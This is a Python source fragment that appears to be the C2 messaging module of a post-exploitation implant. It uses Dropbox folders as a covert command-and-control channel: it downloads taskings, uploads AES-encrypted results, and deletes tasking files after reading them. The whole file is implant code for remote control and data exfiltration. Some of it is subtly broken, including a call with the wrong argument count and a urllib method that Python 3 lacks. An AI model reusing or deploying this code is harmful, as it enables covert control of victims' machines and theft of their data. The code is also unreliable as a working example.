def send_message(packets=None):
    # Requests a tasking or posts data to a randomized tasking URI.
    # If packets == None, the agent GETs a tasking from the control server.
    # If packets != None, the agent encrypts the passed packets and
    #    POSTs the data to the control server.
    global missedCheckins
    global headers
    taskingsFolder="{{ taskings_folder }}"
    resultsFolder="{{ results_folder }}"
    data = None
    requestUri=''
    try:
        del headers['Content-Type']
    except:
        pass


    if packets:
        # aes_encrypt_then_hmac is in stager.py
        encData = aes_encrypt_then_hmac(key, packets)
        data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
        #check to see if there are any results already present

        headers['Dropbox-API-Arg'] = "{\"path\":\"%s/%s.txt\"}" % (resultsFolder, sessionID)

        try:
            pkdata = post_message('https://content.dropboxapi.com/2/files/download', data=None, headers=headers)
        except:
            pkdata = None

        if pkdata and len(pkdata) > 0:
            data = pkdata + data

        headers['Content-Type'] = "application/octet-stream"
        requestUri = 'https://content.dropboxapi.com/2/files/upload'
    else:
        headers['Dropbox-API-Arg'] = "{\"path\":\"%s/%s.txt\"}" % (taskingsFolder, sessionID)
        requestUri='https://content.dropboxapi.com/2/files/download'

    try:
        resultdata = post_message(requestUri, data, headers)
        if (resultdata and len(resultdata) > 0) and requestUri.endswith('download'):
            headers['Content-Type'] = "application/json"
            del headers['Dropbox-API-Arg']
            datastring="{\"path\":\"%s/%s.txt\"}" % (taskingsFolder, sessionID)
            nothing = post_message('https://api.dropboxapi.com/2/files/delete', datastring, headers)

        return ('200', resultdata)

    except urllib.request.Request.HTTPError as HTTPError:
        # if the server is reached, but returns an error (like 404)
        return (HTTPError.code, '')

    except urllib.request.Request.URLError as URLerror:
        # if the server cannot be reached
        missedCheckins = missedCheckins + 1
        return (URLerror.reason, '')

    return ('', '')

def post_message(uri, data):
    global headers
    req = urllib.request.Request(uri)
    for key, value in headers.items():
        req.add_header("%s"%(key),"%s"%(value))

    if data:
        req.add_data(data)

    o=urllib.request.build_opener()
    o.add_handler(urllib.request.ProxyHandler(urllib.request.getproxies()))
    urllib.request.install_opener(o)

    return (urllib.request.urlopen(req).read())